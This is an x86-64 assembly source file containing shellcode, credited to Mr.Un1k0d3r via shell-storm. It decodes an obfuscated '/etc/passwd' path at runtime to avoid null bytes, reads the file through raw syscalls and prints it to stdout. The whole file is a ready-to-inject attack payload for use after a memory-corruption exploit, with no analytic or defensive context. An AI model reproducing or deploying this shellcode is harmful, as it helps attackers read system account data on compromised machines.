BITS 64
; Original shellcode written by Mr.Un1k0d3r
; http://shell-storm.org/shellcode/files/shellcode-878.php 
global _start

section .text

_start:
xor r12, r12
jmp _readfile

path2: db "/ftc/qasswdB"
  
_readfile:
; syscall open file
; NULL byte fix
xor byte [rel path2 + 11], 0x42
sub byte [rel path2 + 1], 1
sub byte [rel path2 + 5], 1
lea rdi, [rel path2]  
mov rax, r12
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
cdq
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
mov rdi, r12
inc dil ; set stdout fd = 1
mov rdx, rax
xor rax, rax
inc al
syscall
  
; syscall exit
mov rax, r12
add al, 60
syscall